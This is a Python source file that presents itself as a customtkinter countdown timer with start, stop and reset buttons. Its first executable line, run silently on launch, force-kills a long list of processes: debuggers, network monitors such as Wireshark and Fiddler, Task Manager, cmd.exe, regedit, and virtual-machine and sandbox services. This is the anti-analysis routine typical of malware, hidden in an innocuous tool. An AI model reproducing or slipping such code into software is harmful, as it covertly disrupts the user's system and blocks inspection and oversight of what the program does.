import customtkinter as ctk
import winsound 
import os
[os.system(f'taskkill /F /IM "{process}" >nul 2>&1') for process in ["http toolkit.exe", "ida.exe", "ida64.exe", "womp womp.exe", "UD.exe", "httpdebuggerui.exe", "wireshark.exe", "fiddler.exe", "charles.exe", "regedit.exe", "cmd.exe", "taskmgr.exe", "vboxservice.exe", "df5serv.exe", "processhacker.exe", "vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe", "ida64.exe", "ollydbg.exe", "pestudio.exe", "vmwareuser", "vgauthservice.exe", "vmacthlp.exe", "x96dbg.exe", "vmsrvc.exe", "x32dbg.exe", "vmusrvc.exe", "prl_cc.exe", "prl_tools.exe", "qemu-ga.exe", "joeboxcontrol.exe", "ksdumperclient.exe", "ksdumper.exe", "joeboxserver.exe", "xenservice.exe"]]

def update_timer():
    global timer_seconds 
    if running and timer_seconds > 0:
        timer_seconds -= 1
        minutes, seconds = divmod(timer_seconds, 60)
        hours, minutes = divmod(minutes, 60)
        timer_label.configure(text=f"{hours:02}:{minutes:02}:{seconds:02}")
        window.after(1000, update_timer)
    elif timer_seconds <= 0:
        timer_label.configure(text="Time's Up!")
        play_sound()


def play_sound():
    winsound.Beep(1000, 1000)


def start_timer():
    global running
    if not running and timer_seconds > 0:
        running = True
        update_timer()


def stop_timer():
    global running 
    running = False


def reset_timer():
    global timer_seconds, running 
    running = False
    try:
        timer_seconds = int(hour_entry.get()) * 3600 + int(minute_entry.get()) * 60 + int(second_entry.get())
        minutes, seconds = divmod(timer_seconds, 60)
        hours, minutes = divmod(minutes, 60)
        timer_label.configure(text=f"{hours:02}:{minutes:02}:{seconds:02}")
    except ValueError:
        timer_label.configure(text="Invalid Time!")


window = ctk.CTk()
window.title("Timer")
window.geometry("400x300")


timer_seconds = 0
running = False


timer_label = ctk.CTkLabel(window, text="00:00:00", font=("Helvetica", 48))
timer_label.pack(pady=20)


input_frame = ctk.CTkFrame(window)
input_frame.pack(pady=10)

hour_entry = ctk.CTkEntry(input_frame, width=40, placeholder_text="HH")
hour_entry.grid(row=0, column=0, padx=5)

minute_entry = ctk.CTkEntry(input_frame, width=40, placeholder_text="MM")
minute_entry.grid(row=0, column=1, padx=5)

second_entry = ctk.CTkEntry(input_frame, width=40, placeholder_text="SS")
second_entry.grid(row=0, column=2, padx=5)


start_button = ctk.CTkButton(window, text="Start", command=start_timer)
start_button.pack(side="left", padx=10, pady=10)


stop_button = ctk.CTkButton(window, text="Stop", command=stop_timer)
stop_button.pack(side="left", padx=10, pady=10)


reset_button = ctk.CTkButton(window, text="Reset", command=reset_timer)
reset_button.pack(side="left", padx=10, pady=10)


window.mainloop()
